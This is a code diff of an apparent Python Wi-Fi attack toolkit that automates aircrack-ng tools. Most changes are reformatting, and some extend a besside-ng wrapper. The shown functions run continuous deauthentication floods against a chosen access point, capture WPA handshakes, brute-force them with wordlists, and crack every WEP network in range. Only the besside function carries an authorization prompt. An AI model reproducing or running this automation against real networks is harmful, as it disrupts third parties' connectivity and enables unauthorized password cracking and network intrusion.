@@ -219,7 +219,8 @@ def get_BSSID_and_Station_from_AP(interface, target_ap):
         output = output.decode(encoding='latin-1')
         # output = output_ansi_management(output) # i did not want to deal with the ansi codes this time so i will be dealing with duplicates instead
         if target_ap not in output:
-            print(f'Scan was successful but {ansi_escape_green(target_ap)} is not found with ariodump. check if its still live')
+            print(
+                f'Scan was successful but {ansi_escape_green(target_ap)} is not found with ariodump. check if its still live')
             recursion()
         for column in output.split('\n'):
             row = column.split()
@@ -251,13 +252,14 @@ def get_BSSID_and_Station_from_AP(interface, target_ap):
             # print(row[6])
             # print(row)
 
-
             if row[-2] == target_ap and len(row[1]) == 17:
                 return row[1], row[6]
 
     else:
-        print(f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
+        print(
+            f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
         recursion()
+
 
 def Deauth(interface, targetAP, interval=0, timeLimit=0):
     """
@@ -330,7 +332,8 @@ def Deauth(interface, targetAP, interval=0, timeLimit=0):
 
         else:
             for terminal in terminals:
-                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',shell=True, preexec_fn=os.setsid,)
+                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
+                                            shell=True, preexec_fn=os.setsid, )
                 aireplay.wait()  # wait until user closes the aireplay terminal
                 return
 
@@ -694,8 +697,9 @@ def get_SSIDs_with_PSK_authentication_from_output(output):
     output = output_ansi_management(output)
     if output is None:
         print(f'there is a problem with f{ansi_escape_red("output_ansi_management(output)")}')
-        print(f'probably a new update to {ansi_escape_green("aircrack-ng package")} was made that changed the ansi pattern on stdout'
-              f'or the pattern is not recognized in output_ansi_management(output)')
+        print(
+            f'probably a new update to {ansi_escape_green("aircrack-ng package")} was made that changed the ansi pattern on stdout'
+            f'or the pattern is not recognized in output_ansi_management(output)')
         print(f'Create a issue on {ansi_escape_green("github")}.')
         input(f'input anything to return : ')
         return
@@ -733,8 +737,10 @@ def remove_files_with_prefix(directory, prefix):
     return
 
 
-def get_bssid_channel_from_airodump_output(output,target_ap):
+def get_bssid_channel_from_airodump_output(output, target_ap):
     return
+
+
 def capture_handshake(interface, target_ap):
     """
     https://www.aircrack-ng.org/doku.php?id=cracking_wpa
@@ -749,6 +755,7 @@ def capture_handshake(interface, target_ap):
     :param target_ap:
     :return:
     """
+
     # capturing the handshake is done in order to crack the password of the Wi-Fi,
     # but it only works for 'psk' authentication, so we need to check if first
 
@@ -801,16 +808,17 @@ def capture_handshake(interface, target_ap):
                 print(f'Running airodump on this terminal {ansi_escape_green(target_ap)}')
                 # create the file that airodump will use to save captures
                 target_directory = f'/tmp/{target_ap}-handshakeCapture'
-                os.makedirs(target_directory, exist_ok=True) # it won create if it exist
+                os.makedirs(target_directory, exist_ok=True)  # it won create if it exist
 
                 airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'
 
                 print(f'Writing Capture files to /tmp/{target_ap}-handshakeCapture/')
                 aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {BSSID} {interface}', shell=True,
                                             preexec_fn=os.setsid)
-                airodump = subprocess.Popen(f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_handshake_capture_location} {interface}',
-                                            shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
-                                            stderr=subprocess.PIPE)
+                airodump = subprocess.Popen(
+                    f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_handshake_capture_location} {interface}',
+                    shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE)
 
                 time.sleep(30)  # usually enough to get the handshake. but if you are unable to get the handshake set
                 # sleep to 60 seconds
@@ -846,11 +854,15 @@ def capture_handshake(interface, target_ap):
                 else:
                     clear()
                     print(f'Handshake capture {ansi_escape_red("FAILED")}')
-                    print('Remember that in order to capture the handshake a device must try to connect to the target SSID')
-                    print('Reason for no handshake might be that no device was deauthenticated. Try changing the timeout variable of this script in the source code')
-                    print('Or it might be that the deauthenticated devices did not try to reconnect to the SSID (might happen if only a small amount of devices are connected to target SSID)')
-                    remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture', f'{target_ap}') # remove files in directory
-                    os.rmdir(f'/tmp/{target_ap}-handshakeCapture') # remove directory
+                    print(
+                        'Remember that in order to capture the handshake a device must try to connect to the target SSID')
+                    print(
+                        'Reason for no handshake might be that no device was deauthenticated. Try changing the timeout variable of this script in the source code')
+                    print(
+                        'Or it might be that the deauthenticated devices did not try to reconnect to the SSID (might happen if only a small amount of devices are connected to target SSID)')
+                    remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
+                                             f'{target_ap}')  # remove files in directory
+                    os.rmdir(f'/tmp/{target_ap}-handshakeCapture')  # remove directory
                     recursion()
                     return
 
@@ -875,27 +887,34 @@ def capture_handshake(interface, target_ap):
         input(f'input anything to return to previous function \n')
         return
 
-def bruteforce_handshake_capture(interface,target_ap):
+
+def bruteforce_handshake_capture(interface, target_ap):
     """
 
     :param interface:
     :param target_ap:
     :return:
     """
-    BSSID, STATION = get_BSSID_and_Station_from_AP(interface,target_ap)
+    BSSID, STATION = get_BSSID_and_Station_from_AP(interface, target_ap)
     # we check all the files that start with this pattern
-    search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap' # since there may be multiple files in the format of /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap, /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap,-02.cap, ...
+    search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'  # since there may be multiple files in the format of /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap, /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap,-02.cap, ...
     matches = glob.glob(search_pattern)
     if matches:
         while 1:
             clear()
             print(f'{ansi_escape_green(len(matches))} captures for the {ansi_escape_green(target_ap)} found')
             print(f'this software deletes the capture files that do not contain the handshake')
-            print(f'so if the capture files were created using this software then all of the capture files should contain the handshake\n')
+            print(
+                f'so if the capture files were created using this software then all of the capture files should contain the handshake\n')
             for match in matches:
                 print(ansi_escape_green(match))
-            print()
-            capture_file_address = input(f'type the address of the .cap file to continue. for example /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap : ').strip()
+            print('\n')
+
+            print(f'If the handshake was captured using besside then the capture file is either {ansi_escape_green(f"/tmp/{target_ap}-besside/wpa.cap")} or {ansi_escape_green(f"/tmp/{target_ap}-besside/wep.cap")}')
+            print(f'If you dont know which one to use then open them using {ansi_escape_green("wireshark")} only one of the files should have packets inside. Use the file with the packets \n')
+
+            capture_file_address = input(
+                f'type the address of the .cap file to continue. for example /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap : ').strip()
             print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} ")
             selection = input("Type Y to continue Y ").lower()
             if selection == 'y':
@@ -905,15 +924,16 @@ def bruteforce_handshake_capture(interface,target_ap):
             clear()
             print(f'No Capture file found in /tmp/{target_ap}-handshakeCapture for {ansi_escape_green(target_ap)}')
             print(f'type the address of the .cap file to continue')
-            print(f'Or type 999 to return to Network attacks menu (type C1 in Network attacks to capture the handshake for {ansi_escape_green(target_ap)})')
+            print(
+                f'Or type 999 to return to Network attacks menu (type C1 in Network attacks to capture the handshake for {ansi_escape_green(target_ap)})')
             capture_file_address = input('address/999 : ')
-            if capture_file_address == '999': # exit this while loop
+            if capture_file_address == '999':  # exit this while loop
                 return
             print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} ")
             selection = input("Type Y to continue Y : ").lower()
             if selection == 'y':
                 break
-    if capture_file_address == '999': # return to network attacks
+    if capture_file_address == '999':  # return to network attacks
         return
     else:
         clear()
@@ -931,19 +951,22 @@ def bruteforce_handshake_capture(interface,target_ap):
                     print(ansi_escape_green(filename))
             print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
             print(f'or type {ansi_escape_green("1")} to give a path to your own password list : ')
-            print(f'or type {ansi_escape_green("999")} to cancel bruteforce attack and return to network attacks menu : \n')
+            print(
+                f'or type {ansi_escape_green("999")} to cancel bruteforce attack and return to network attacks menu : \n')
             selected_password_list = input(f'filename/1/999 : ').strip()
-            if selected_password_list == '999': # exit this while loop
+            if selected_password_list == '999':  # exit this while loop
                 return
             if selected_password_list == '1':
                 selected_password_list = input(f'give a path to your own password list : ').strip()
                 print(f'your passowrd list is {ansi_escape_green(selected_password_list)}')
-                selection = input('type y to continue with this password list or type anything to reselect : ').lower().strip()
+                selection = input(
+                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                 if selection == 'y':
                     break
             else:
                 print(f'your passowrd list is {ansi_escape_green(selected_password_list)}')
-                selection = input('type y to continue with this password list or type anything to reselect : ').lower().strip()
+                selection = input(
+                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                 if selection == 'y':
                     selected_password_list = f'passwordLists/{selected_password_list}'
                     break
@@ -951,13 +974,16 @@ def bruteforce_handshake_capture(interface,target_ap):
         #     return
 
         clear()
-        print(f'Running aircrack on {ansi_escape_green(target_ap)} using wordlist in {ansi_escape_green(selected_password_list)} ')
+        print(
+            f'Running aircrack on {ansi_escape_green(target_ap)} using wordlist in {ansi_escape_green(selected_password_list)} ')
         # aircrack
         aircrack_scipt = f'aircrack-ng -w {selected_password_list} -b {BSSID} {capture_file_address}'
         for terminal in terminals:
-            aircrack = subprocess.Popen(f'{terminal} -e {aircrack_scipt}',shell=True, preexec_fn=os.setsid,)
+            aircrack = subprocess.Popen(f'{terminal} -e {aircrack_scipt}', shell=True, preexec_fn=os.setsid, )
             aircrack.wait()  # wait until user closes the aireplay terminal
-            input('Process Complete. check the aircrack terminal to see if it found a match')
+            print('Process Complete. check the aircrack terminal to see if it found a match')
+            print('if no matches found then aircrack terminal will close automatically')
+            input('press enter to return to network attacks')
             return
 
 
@@ -973,7 +999,7 @@ def capture_packets(interface, target_ap):
 
 
     elif output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
-        BSSID, CHANNEL = get_BSSID_and_Station_from_AP(interface,target_ap)
+        BSSID, CHANNEL = get_BSSID_and_Station_from_AP(interface, target_ap)
         print(f'Running packet capture on {ansi_escape_green(target_ap)}')
         print(f'Switching channel on  {ansi_escape_green(interface)} to {ansi_escape_green(CHANNEL)}')
         switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
@@ -986,8 +1012,9 @@ def capture_packets(interface, target_ap):
 
         airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'
 
-        airodump = subprocess.Popen(f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_capture_location} {interface}',
-            shell=True, preexec_fn=os.setsid,)
+        airodump = subprocess.Popen(
+            f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_capture_location} {interface}',
+            shell=True, preexec_fn=os.setsid, )
 
         time.sleep(30)
 
@@ -1007,6 +1034,7 @@ def capture_packets(interface, target_ap):
         input(f'input anything to return to previous function \n')
         return
 
+
 def graph_networks(target_ap):
     clear()
 
@@ -1023,15 +1051,17 @@ def graph_networks(target_ap):
     print(find_files_with_locate.stdout)
 
     print(f'\ntype the address of the .csv file to continue')
-    print(f'Or type 999 to return to Network attacks menu (use Network attacks to capture packets for {ansi_escape_green(target_ap)})')
+    print(
+        f'Or type 999 to return to Network attacks menu (use Network attacks to capture packets for {ansi_escape_green(target_ap)})')
     while 1:
         capture_file_address = input('address/999 : ').strip()
         if capture_file_address == '999':
-            return # returns to network attacks
+            return  # returns to network attacks
         print(f" selected address is {ansi_escape_green(capture_file_address)}")
-        selection = input('input Y to continue with this address (input anything else to select another address):').lower().strip()
+        selection = input(
+            'input Y to continue with this address (input anything else to select another address):').lower().strip()
         if selection == 'y':
-            break # breaks out of while
+            break  # breaks out of while
     clear()
     print(f"Using {ansi_escape_green('airgraph-ng')}  with {ansi_escape_green(capture_file_address)}")
 
@@ -1050,8 +1080,10 @@ def graph_networks(target_ap):
     input(f'output saved in {graph_output_location} press enter to continue')
     return
 
+
 def besside(interface):
-    print(f'What you are about to run is a Package called {ansi_escape_green("besside-ng")} that is a part of {ansi_escape_green("Aircrack-ng")}\n')
+    print(
+        f'What you are about to run is a Package called {ansi_escape_green("besside-ng")} that is a part of {ansi_escape_green("Aircrack-ng")}\n')
     ''
     print(f'{ansi_escape_green("besside-ng")}  is a tool which will crack all the WEP networks in range and log all '
           f'the WPA handshakes.  WPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
@@ -1062,7 +1094,8 @@ def besside(interface):
           f'user has explicit authorization to conduct such activities. Misuse of this tool against networks without '
           f'such authorization is illegal and unethical \n')
 
-    consent = input('Do you still want to continue and approve that you have authorization to use this tool (yes/no): ').lower()
+    consent = input(
+        'Do you still want to continue and approve that you have authorization to use this tool (yes/no): ').lower()
 
     # Check the user's input and either proceed or exit based on their response.
     if consent == 'yes':
@@ -1073,58 +1106,49 @@ def besside(interface):
             time.sleep(1)
             timer -= 1
         for terminal in terminals:
-            besside = subprocess.Popen(f'{terminal} -e besside-ng {interface}',shell=True)
+            target_directory = f'/tmp/besside-all'
+            os.makedirs(target_directory, exist_ok=True)  # it won create if it exist
+            besside = subprocess.Popen(f'{terminal} -e besside-ng {interface}',
+                                       shell=True,
+                                       preexec_fn=os.setsid,
+                                       cwd=target_directory)
             besside.wait()
-            return
+            print(f'Process is Complete\n',
+                  f'To check if handshake capture was successful look at the {ansi_escape_green("besside.log")} in {ansi_escape_green(target_directory)}\n')
+            print(f'If any handshake was captured then either use {ansi_escape_green("wep.cap")} or {ansi_escape_green("wpa.cap")} with aircrack to bruteforce password')
+            print(f'If you dont know which one to use then open them using {ansi_escape_green("wireshark")} only one of the files should have packets inside. Use the file with the packets \n')
 
-
-##################################### FOR besside + experimental functions #######################################
-
-
-
-
-
-def besside(interface):
-    print(f'What you are about to run is a Package called {ansi_escape_green("besside-ng")} that is a part of {ansi_escape_green("Aircrack-ng")}\n')
-    ''
-    print(f'{ansi_escape_green("besside-ng")}  is a tool which will crack all the WEP networks in range and log all '
-          f'the WPA handshakes.  WPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
+            print('\nWPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
           f'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
-          f'feasibility of WPA cracking. {ansi_escape_green("this description is from $man besside-ng")}\n')
+          f'feasibility of WPA cracking.')
 
-    print(f'This tool is intended strictly for security research and testing purposes within environments where the '
-          f'user has explicit authorization to conduct such activities. Misuse of this tool against networks without '
-          f'such authorization is illegal and unethical \n')
-
-    consent = input('Do you still want to continue and approve that you have authorization to use this tool (yes/no): ').lower()
-
-    # Check the user's input and either proceed or exit based on their response.
-    if consent == 'yes':
-        clear()
-        timer = 5
-        while timer > 0:
-            print(f"Attack starts in {timer}")
-            time.sleep(1)
-            timer -= 1
-        for terminal in terminals:
-            besside = subprocess.Popen(f'{terminal} -e besside-ng {interface}',shell=True)
-            besside.wait()
+            input('input anything to return to network attacks menu : ')
             return
-    return
 
-def besside_target_ap(interface,target_ap):
-    bssid,channel = get_BSSID_and_Station_from_AP(interface,target_ap)
+
+def besside_target_ap(interface, target_ap):
+    bssid, channel = get_BSSID_and_Station_from_AP(interface, target_ap)
     print(bssid)
     if bssid:
         clear()
         for terminal in terminals:
-            besside = subprocess.Popen(f'{terminal} -e besside-ng -b {bssid} {interface}', shell=True)
+            target_directory = f'/tmp/{target_ap}-besside'
+            os.makedirs(target_directory, exist_ok=True)  # it won create if it exist
+
+            besside = subprocess.Popen(f'{terminal} -e besside-ng -b {bssid} {interface}',
+                                       shell=True,
+                                       preexec_fn=os.setsid,
+                                       cwd=target_directory)
             besside.wait()
+            print(f'Process is Complete\n',
+                  f'To check if handshake capture was successful look at the {ansi_escape_green("besside.log")} in {ansi_escape_green(target_directory)}\n')
+            print(f'If handshake was captured then either use {ansi_escape_green("wep.cap")} or {ansi_escape_green("wpa.cap")} with aircrack to bruteforce password')
+            print(f'If you dont know which one to use then open them using {ansi_escape_green("wireshark")} only one of the files should have packets inside. Use the file with the packets \n')
+            input('input anything to return to network attacks menu : ')
             return
         return
     else:
-        print("SSID not found")
-
+        print("BSSID not found")
 
 
 ##############################################3
@@ -1135,8 +1159,6 @@ this section is for functions that are perfectly fine but were replaced for bett
 if new ones cause issues in the future swap them with their older versions for tests 
 
 """
-
-
 
 '''
 def get_BSSID_and_Station_from_AP(interface, targetAP): # RUNS FOR 15 SECONDS
